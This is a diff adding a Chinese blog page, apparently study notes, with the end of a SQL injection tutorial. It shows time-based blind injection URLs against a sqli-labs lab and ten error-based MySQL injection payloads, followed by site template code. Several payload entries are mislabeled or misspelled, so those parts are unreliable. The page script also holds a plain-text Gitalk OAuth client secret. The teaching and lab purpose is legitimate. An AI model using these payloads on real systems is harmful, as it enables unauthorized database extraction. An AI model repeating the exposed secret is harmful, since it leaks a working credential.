+1.    eg：select if((length(version())&gt;3),(sleep(5),0);    判断version()字符串长度是否大于3，是则停顿5秒，否则直接返回</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064039806.png" alt></p>
+<pre><code>        ii.    case判断    类似于 switch
+1.    eg：case length(version())&gt;3 when 12 then 12 when 1 then ‘true’ when 0 then ‘false’ end;
+判断version()字符串是否大于3 当结果是12时输出12，当结果是1时输出true 当结果是0时输出false</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064055807.png" alt></p>
+<pre><code>     以上通过对条件和时间的判断，结合盲注的特点完成对注入点的时间延时盲注，导出数据库的信息。
+3．    开始操作（依次：获取数据的行数，单行数据的字符串长度，单行字符串中每个字符的定位）
+    a)    查询数据库中表的信息
+        i.    获取schemata表中schemata_name的第一行数据的字符串长度
+http://192.168.100.90/sqli-labs-master/Less-9/?id=1&#39; and if(length((select schema_name from information_schema.schemata limit 0,1))&gt;5,sleep(3),0)#
+        ii.    通过ascii和mid函数判断该字符的第一个ascii字符
+http://192.168.100.90/sqli-labs-master/Less-9/?id=1&#39; and if(ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;5,sleep(3),0)#
+或者这样写
+case (ascii(mid(select schema_name from information_schema.schemata limit 0,1))&gt;100) when benchmark(10000000,md5(1)) else 0 end
+
+    同时可以使用BurpSuite抓包进行数据的修改,在post数据头的修改中很方便
+    依此类推即可爆出数据库的相关信息。</code></pre><h3 id="十种报错注入"><a href="#十种报错注入" class="headerlink" title="十种报错注入"></a>十种报错注入</h3><p>摘自《代码审计》</p>
+<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="1。floor"><a href="#1。floor" class="headerlink" title="1。floor()"></a>1。floor()</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><pre><code>必须有三个函数    floor()向下取整    rand()随机数  group by()对查询的相同的项进行分组计数
+报错的原因：
+    在group_by()对数据进行分组计数时，floor和rand的结合配上rand()结果*2得到的数据只有0或1，
+    当group_by遇到1时新建列计数，遇到0时，调用floor()函数再次随机如果结果是1则group_by在插入表项计数时产生主建唯一冲突，报错。</code></pre><p><strong>payload</strong></p>
+<pre><code>Select 1 from (select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x)a)</code></pre><h5 id="2。extractvalue"><a href="#2。extractvalue" class="headerlink" title="2。extractvalue()"></a>2。extractvalue()</h5><p><strong>payload</strong></p>
+<pre><code>extractvalue(1,concat(0x5c,(select user())))</code></pre><h5 id="3。updatexml"><a href="#3。updatexml" class="headerlink" title="3。updatexml()"></a>3。updatexml()</h5><p><strong>payload</strong></p>
+<pre><code>updatexml(1,concat(0x5e24,(select user()),0x5e24),1)</code></pre><h5 id="4。geometrycollection"><a href="#4。geometrycollection" class="headerlink" title="4。geometrycollection()"></a>4。geometrycollection()</h5><p><strong>payload</strong></p>
+<pre><code>GeometryCollection((select * from(select * from(select user())a)b))</code></pre><h5 id="5。multipoint"><a href="#5。multipoint" class="headerlink" title="5。multipoint()"></a>5。multipoint()</h5><p><strong>payload</strong></p>
+<pre><code>polygon((select * from(select * from(select user())a)b))</code></pre><h5 id="6。polygon"><a href="#6。polygon" class="headerlink" title="6。polygon()"></a>6。polygon()</h5><p><strong>payload</strong></p>
+<pre><code>multipoint((select * from(select * from(select user())a)b))</code></pre><h5 id="7。multipolygon"><a href="#7。multipolygon" class="headerlink" title="7。multipolygon()"></a>7。multipolygon()</h5><p><strong>payload</strong></p>
+<pre><code>multilinestring((select * from(select * from(select user())a)b))</code></pre><h5 id="8。linestring"><a href="#8。linestring" class="headerlink" title="8。linestring()"></a>8。linestring()</h5><p><strong>payload</strong></p>
+<pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="9。multilinestring"><a href="#9。multilinestring" class="headerlink" title="9。multilinestring()"></a>9。multilinestring()</h5><p><strong>payload</strong></p>
+<pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="10。exp"><a href="#10。exp" class="headerlink" title="10。exp()"></a>10。exp()</h5><p><strong>payload</strong></p>
+<pre><code>Exp(~(select * from(select user())a))</code></pre>
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《SQL注入 原理及分类》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/01/SQL注入-原理及分类/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                Evolyutsiya
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '0900bb25542f967729e4',
+        clientSecret: '09b4dc7bcd15f4fceedce63e682e0cf8f116f882',
+        repo: 'blogtalk',
+        owner: 'Evolyutsiya',
+        admin: "Evolyutsiya",
+        id: '2019-09-01T17-48-20',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/09/01/SQL注入-预防/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="SQL注入 预防">
+                        
+                        <span class="card-title">SQL注入 预防</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            基本思路是对用户输入的参数进行检测处理，预防意外发生。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/i春秋/" class="post-category" target="_blank">
+                                    i春秋
+                                </a>
+                            
+                            <a href="/categories/i春秋/SQL注入/" class="post-category" target="_blank">
+                                    SQL注入
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/第七周/" target="_blank">
+                        <span class="chip bg-color">第七周</span>
+                    </a>
+                    
+                    <a href="/tags/SQL注入/" target="_blank">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/09/01/关于构建完全隔离虚拟机/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="虚拟机的隔离设置">
+                        
+                        <span class="card-title">虚拟机的隔离设置</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            完全独立于系统的隐藏虚拟机环境
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/i春秋/" class="post-category" target="_blank">
+                                    i春秋
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/工具/" target="_blank">
+                        <span class="chip bg-color">工具</span>
+                    </a>
+                    
+                    <a href="/tags/第七周/" target="_blank">
+                        <span class="chip bg-color">第七周</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Evolyutsiya<br />'
+            + '作者: Evolyutsiya<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">40.9k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Evolyutsiya/Evolyutsiya.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Evolyutsiya@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3337234952" class="tooltipped" data-tooltip="QQ联系我: 3337234952" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
